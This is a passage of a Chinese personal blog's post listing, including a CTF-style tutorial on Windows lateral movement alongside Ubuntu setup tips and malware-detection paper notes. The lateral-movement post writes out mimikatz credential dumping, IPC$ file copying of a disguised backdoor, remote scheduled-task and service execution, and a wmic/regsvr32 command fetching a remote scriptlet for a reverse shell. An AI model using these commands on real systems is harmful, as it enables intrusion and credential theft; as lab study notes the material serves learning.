-              <time title="Created: 2022-11-28 14:17:22" itemprop="dateCreated datePublished" datetime="2022-11-28T14:17:22+08:00">2022-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-05-08 23:57:14" itemprop="dateModified" datetime="2023-05-08T23:57:14+08:00">2023-05-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>VirusShare 00177 dataset and APIMDS</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="post-title-link" itemprop="url">横向移动</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-11-07 14:19:49" itemprop="dateCreated datePublished" datetime="2022-11-07T14:19:49+08:00">2022-11-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-11-08 16:00:23" itemprop="dateModified" datetime="2022-11-08T16:00:23+08:00">2022-11-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="利用Windows内置工具"><a href="#利用Windows内置工具" class="headerlink" title="利用Windows内置工具"></a>利用Windows内置工具</h2><ul>
-<li>IPC+Schtasks+AT</li>
-<li>IPC+SC(服务)</li>
-<li>WMIC(查询信息，补丁、账号；进程创建)</li>
-<li>WinRM服务</li>
-</ul>
-<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><blockquote>
-<p>IPC$,Internet Process Connection，是共享“命名管道”的资源，它是为了<strong>让进程间通信</strong>而开放的命名管道， 输入<strong>可信</strong>用户名、密码建立管道，借助该管道，可以实现加密数据的交换，访问远程计算机。</p>
-</blockquote>
-<p>利用IPC$,需要使用Administrator账号权限。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.开放了139、445端口</p>
-<p>2.目标机器开启IPC$文件共享服务（该服务建立的初衷是为了管理员方便的管理远程计算机）。</p>
-<p>3.需要目标机器的管理员账号和密码</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Documents</span>&gt;<span class="title">netstat</span> -<span class="title">ano</span>|<span class="title">findstr</span> 445</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:445            0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.66.1:54207     192.168.66.131:445     <span class="title">ESTABLISHED</span>     4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    [::]:445               [::]:0                 <span class="title">LISTENING</span>       4</span></span><br></pre></td></tr></table></figure>
-<h3 id="获取管理员账号密码："><a href="#获取管理员账号密码：" class="headerlink" title="获取管理员账号密码："></a>获取管理员账号密码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump密码凭据获取</span><br><span class="line">去cmd5.com在线解密即可</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">load mimikatz</span><br><span class="line">help</span><br><span class="line">#获取明文密码</span><br><span class="line">cred_kerberos</span><br></pre></td></tr></table></figure>
-<p>当无法获取到明文密码时，可以采取<strong>哈希扩展攻击</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存放在某个文件；</span><br><span class="line">使用弱口令、口令复用；</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667886774960.png" alt="1667886774960"></p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use  \\192.168.66.131\ipc$ /user:administrator &quot;passwd&quot;</span><br><span class="line">#该命令可能被对方防火墙拦下，报告系统错误67 找不到网络名</span><br><span class="line">#查看链接情况</span><br><span class="line">net use  </span><br><span class="line">#查看目标主机时间</span><br><span class="line">net time \\192.168.66.131 </span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删除链接,并且在非交互模式下输入yes</span><br><span class="line">net use \\192.168.66.131\ipc$ /del /y</span><br><span class="line">net use * /del /y</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>对于同一个机器，只能对目标主机<strong>建立一个net use链接</strong>，建立第二个时会报错（报告账号或者密码错误）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#文件上传下载</span><br><span class="line">copy shell.exe \\192.168.66.131\c$\windows\temp\plugin_uddate.exe</span><br><span class="line">#查看目标机器中的文件</span><br><span class="line">dir \\192.168.66.131\d$</span><br><span class="line"></span><br><span class="line">copy \\192.168.66.131\d$\hello.exe d:\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 改变代码页编码为utf-8，gbk 936</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">#谷歌浏览器快速切换标签页</span><br><span class="line">ctrl+shift+tab</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h2><h3 id="创建计划任务执行我的后门"><a href="#创建计划任务执行我的后门" class="headerlink" title="创建计划任务执行我的后门"></a>创建计划任务执行我的后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.66.131 /u administrator /p &quot;passwd&quot; /sc MINUTE /mo 1 /tn test /tr &quot;c:\\windows\\temp\\plugin_uddate.exe&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891124571.png" alt="1667891124571"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCCESS: The scheduled task &quot;test&quot; has successfully been created.</span><br></pre></td></tr></table></figure>
-<p>正常，过一分钟后木马被执行</p>
-<p>账户输错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: No mapping between account names and security IDs was done.</span><br><span class="line">(43,4):LogonType:</span><br></pre></td></tr></table></figure>
-<p><strong>注：只要执行了计划任务，一定会被系统日志记录下来。</strong></p>
-<h3 id="tasklist查看目标机器上的进程"><a href="#tasklist查看目标机器上的进程" class="headerlink" title="tasklist查看目标机器上的进程"></a>tasklist查看目标机器上的进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#展示详细信息</span><br><span class="line">tasklist /s \\192.168.66.131 /v  </span><br><span class="line">tasklist /s \\192.168.66.131 /u administrator /p &quot;passwd&quot;</span><br><span class="line">vm3dservice.exe</span><br><span class="line">VGAuthService</span><br></pre></td></tr></table></figure>
-<h3 id="删除指定名称的计划任务"><a href="#删除指定名称的计划任务" class="headerlink" title="删除指定名称的计划任务"></a>删除指定名称的计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">66</span>.<span class="number">131</span> /tn test /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
-<h2 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h2><h3 id="指定时间创建计划任务"><a href="#指定时间创建计划任务" class="headerlink" title="指定时间创建计划任务"></a>指定时间创建计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.66.131 </span><br><span class="line">at  \\192.168.66.131 15:08 D:\\hello.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The AT command has been deprecated. Please use schtasks.exe instead.</span><br><span class="line">Added a new job with job ID = 1</span><br></pre></td></tr></table></figure>
-<p><strong>注：At在Windows Server 2012等新版系统中被弃用</strong></p>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891456404.png" alt="1667891456404"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.66.131 /tn At1 /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
-<h2 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h2><h3 id="创建服务执行"><a href="#创建服务执行" class="headerlink" title="创建服务执行"></a>创建服务执行</h3><p><strong>注：binpath= 后面必须有空格</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 create test binpath= &quot;D:\\hello.exe&quot; obj= &quot;Administrator&quot; password= passwd </span><br><span class="line">sc \\192.168.66.131 start test</span><br></pre></td></tr></table></figure>
-<h3 id="查看服务是否创建成功"><a href="#查看服务是否创建成功" class="headerlink" title="查看服务是否创建成功"></a>查看服务是否创建成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 qc test</span><br></pre></td></tr></table></figure>
-<h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p> Windows Management Instrumentation </p>
-<h3 id="管理远程计算机node的进程process"><a href="#管理远程计算机node的进程process" class="headerlink" title="管理远程计算机node的进程process"></a>管理远程计算机node的进程process</h3><p>借助regsvr32,进而反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.66.131 /user:administrator /password:passwd process call create &quot;regsvr32&quot; /s /n /u /i:http:192.168.66.1:8080/fesddasji.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
-<p>注：wmic没有回显，可以借助wmicexec.vbs脚本实现回显。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#列出简洁的系统信息</span><br><span class="line">wmic os list brief</span><br></pre></td></tr></table></figure>
-<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jobs</span><br><span class="line">#获取建立的会话</span><br><span class="line">sessions</span><br><span class="line"># 选择一个会话</span><br><span class="line">sessions 5</span><br><span class="line">#获取用户名</span><br><span class="line">meterpreter:getuid</span><br><span class="line">#退出当前会话</span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="post-title-link" itemprop="url">Ubuntu22虚拟机安装</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-11-05 19:59:30 / Modified: 11:19:56" itemprop="dateCreated datePublished" datetime="2022-11-05T19:59:30+08:00">2022-11-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-piix4-smbus-SMBus-Host-controller-not-enabled"><a href="#1-piix4-smbus-SMBus-Host-controller-not-enabled" class="headerlink" title="1.piix4_smbus **SMBus Host controller not enabled"></a>1.piix4_smbus <em>**</em>SMBus Host controller not enabled</h2><blockquote>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46238869/article/details/119717890">weixin_46238869的blog</a> </p>
-</blockquote>
-<p>1.在开机界面按住shift键，进入后选择[Advanced Option]—&gt;[Recovery Mode]，获得恢复菜单如下；</p>
-<p><img src="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/1667616777282.png" alt="1667616777282"></p>
-<p>2.选择[root] ，连敲两次回车，获得root命令行。</p>
-<p><img src="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/1667616901206.png" alt="1667616901206"></p>
-<p>3.命令行中输入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount,rw /    #用可读写模式重新挂上根分区</span><br><span class="line">vi /etc/modprobe.d/blacklist.conf   #修改模块黑名单</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/1667617258574.png" alt="1667617258574"></p>
-<p>4.按住i，在文件末尾追加下面的黑名单，保存。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist intel_powerclamp</span><br><span class="line">blacklist i2c_piix4</span><br></pre></td></tr></table></figure>
-<p>5.更新镜像。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-initramfs -u -k all</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/1667617685163.png" alt="1667617685163"></p>
-<ol>
-<li>最后输入reboot重启 </li>
-</ol>
-<h2 id="2-mtd-device-must-be-supplied"><a href="#2-mtd-device-must-be-supplied" class="headerlink" title="2.mtd device must be supplied"></a>2.mtd device must be supplied</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1981622">BugReport</a></p>
-<p><a target="_blank" rel="noopener" href="https://askubuntu.com/questions/1417618/mtd-device-must-be-supplied-device-name-is-empty">StackOverflow</a></p>
-</blockquote>
-<ol>
-<li>这个消息是由于mtdpstore module的默认配置有问题。 </li>
-<li>不影响启动，在启动后，做一次update就可以消除这个问题。</li>
-</ol>
-<h2 id="3-nouveau-unknown-chipset"><a href="#3-nouveau-unknown-chipset" class="headerlink" title="3.nouveau unknown chipset"></a>3.nouveau unknown chipset</h2><p><a target="_blank" rel="noopener" href="https://www.linuxquestions.org/questions/linux-newbie-8/how-can-we-fix-this-nouveau-000-07-00-0-unknown-chipset-b76000a1-4175692213/">显卡驱动不支持问题</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add nomodeset nouveau.modeset=0 to the kernel options to fix it.</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://www.reddit.com/r/Ubuntu/comments/g37gvy/i_added_nouveaumodeset0_to_the_grub_cmdline/">grub编辑</a></p>
-<p> 1.Vmware—&gt;【加速3D图形】 取消勾选</p>
-<p>2.本机命令行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure>
-<h1 id><a href="#" class="headerlink" title=" "></a> </h1>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot10/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/Few-Shot10/" class="post-title-link" itemprop="url">Malware-SMELL: A zero-shot learning strategy for detecting zero-day vulnerabilities</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-11-04 20:43:22" itemprop="dateCreated datePublished" datetime="2022-11-04T20:43:22+08:00">2022-11-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-06-16 20:12:33" itemprop="dateModified" datetime="2023-06-16T20:12:33+08:00">2023-06-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>Pedro H. Barros, Eduarda T.C. Chagas, Leonardo B. Oliveira, Fabiane Queiroz, Heitor S. Ramos, Malware‐SMELL: A zero‐shot learning strategy for detecting zero‐day vulnerabilities,Computers &amp; Security,Volume 120,3 June 2022,102785,ISSN 0167-4048,【B刊】</p>
-</blockquote>
-<p>可以划分到嵌入式学习、度量学习里。</p>
-<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
-<li>数据无关的度量值（Euclidean, Cosine, and Manhattan)</li>
-</ul>
-<h3 id="度量学习"><a href="#度量学习" class="headerlink" title="度量学习"></a>度量学习</h3><p>从数据中构造任务特定的度量函数，使得相同标签的样本在Latent feature space中足够靠近，不同标签的样本在潜在空间中尽可能远离。</p>
-<h3 id="SNN"><a href="#SNN" class="headerlink" title="SNN"></a>SNN</h3><p>孪生网络，经过一个非线性的映射函数变换(待学习的加密器f θ ），f θ中的特征提取函数将样本对映射为潜在表征向量。</p>
-<p>输入：样本对，标签（similar,dissimilar)  同类样本就打similar标签，否则打dissimilar。</p>
-<p><img src="/categories/ML/Few-Shot10/1668431394728.png" alt="1668431394728"></p>
-<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><h3 id="MaleViz："><a href="#MaleViz：" class="headerlink" title="MaleViz："></a>MaleViz：</h3><p>涉及26个（25恶意+1良性）类的字节图像的语料库，14226 images.</p>
-<p><img src="/categories/ML/Few-Shot10/1668746105269.png" alt="1668746105269"></p>
-<h3 id="Malimg："><a href="#Malimg：" class="headerlink" title="Malimg："></a>Malimg：</h3><p>9339 samples from 25 malware families, obtained through experiments of mixtures of  network and the Windows操作系统恶意软件</p>
-<blockquote>
-<p>Nataraj, L., Karthikeyan, S., Jacob, G., Manjunath, B.S., 2011. Malware images: Visualization and automatic classifification. In: Proceedings of the 8th International Symposium on Visualization for Cyber Security. Association for Computing Machinery, New York, NY, USA.</p>
-</blockquote>
-<p><img src="/categories/ML/Few-Shot10/1668746119695.png" alt="1668746119695"></p>
-<h2 id="解决的问题："><a href="#解决的问题：" class="headerlink" title="解决的问题："></a>解决的问题：</h2><p>过去的映射函数没有学习到样本对之间的信息。</p>
-<h2 id="采用的方法："><a href="#采用的方法：" class="headerlink" title="采用的方法："></a>采用的方法：</h2><p>将数据对映射到一个相似空间。正则函数避免过拟合。</p>
-<h2 id="研究方向"><a href="#研究方向" class="headerlink" title="研究方向"></a>研究方向</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot09/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/Few-Shot09/" class="post-title-link" itemprop="url">CAD-FSL: Code-Aware Data Generation based Few-Shot Learningfor Efficient Malware Detection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-10-29 20:43:22" itemprop="dateCreated datePublished" datetime="2022-10-29T20:43:22+08:00">2022-10-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-11-12 23:12:55" itemprop="dateModified" datetime="2022-11-12T23:12:55+08:00">2022-11-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/ComplexNetWork/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/Notes/ComplexNetWork/" class="post-title-link" itemprop="url">Attack Robustness and Centrality of Complex Networks</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-10-21 15:43:22" itemprop="dateCreated datePublished" datetime="2022-10-21T15:43:22+08:00">2022-10-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-10-24 19:01:44" itemprop="dateModified" datetime="2022-10-24T19:01:44+08:00">2022-10-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>Iyer, Swami &amp; Killingback, Timothy &amp; Sundaram, Bala &amp; Wang, Zhen. (2013). Attack Robustness and Centrality of Complex Networks. PloS one. 8. e59613. 10.1371/journal.pone.0059613. </p>
-</blockquote>
-<p>组件失败时系统的稳定性——依赖于底层网络的稳定性——顶点移除时网络结构的改变</p>
-<ul>
-<li>betweenness centrality.</li>
-<li>基于度分布、聚集系数、组合系数去衡量复杂网络的鲁棒性</li>
-</ul>
-<p>研究基于度、中间度、接近度和特征向量中心性的<code>去除方案</code>对各种模型网络的影响，包括幂律和指数分布、不同聚类系数和不同分类程度的模型网络</p>
-<h2 id="网络渗流和稳定性"><a href="#网络渗流和稳定性" class="headerlink" title="网络渗流和稳定性"></a>网络渗流和稳定性</h2><p>渗透：取一个网络并去除其顶点的某些部分（以及连接到顶点的边）的过程。</p>
-<p>对于疫苗接种或者节点失效来说，虽然它物理上还存在，但从功能视图上看一些节点被移除了。</p>
-<p><strong>若渗流后的最大组件（相对于原始网络规模）在规模上变得太小，系统不可正常工作。</strong></p>
-<p>系统稳定性衡量函数为移除节点的函数：</p>
-<p><img src="/categories/Notes/ComplexNetWork/1666345435871.png" alt="1666345435871"></p>
